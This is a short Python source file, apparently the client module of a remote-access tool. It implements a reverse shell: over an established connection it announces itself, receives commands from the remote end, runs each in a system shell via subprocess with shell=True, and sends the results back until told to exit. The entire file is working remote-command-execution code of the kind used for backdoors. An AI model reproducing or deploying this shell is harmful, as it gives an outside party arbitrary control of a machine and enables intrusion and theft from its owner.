import subprocess
from colorama import Style, Fore

from Client.helpers import send_shell_results




def execute(conn, args):
    print("Opening Reverse Shell...")
    rshell(conn)
    print("Reverse Shell closed.")

def rshell(conn):
    conn.sendall("RSHELL.OPEN".encode('utf-8'))
    while True:
        command = conn.recv(1024).decode('utf-8').rstrip('\n')
        print(Fore.GREEN + "RShell remote command: {}".format(command) + Style.RESET_ALL)
        if command.lower() == 'exit':
            break
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  stdin=subprocess.PIPE)
        results = output.stdout.read().decode('utf-8')
        errors = output.stderr.read().decode('utf-8')
        if not results and not errors:
            results = "NONE"
        print(Fore.BLUE + "RShell results: " + Style.RESET_ALL + "{}".format(results if results else errors)) # includes newline

        send_shell_results(conn, results if results else errors)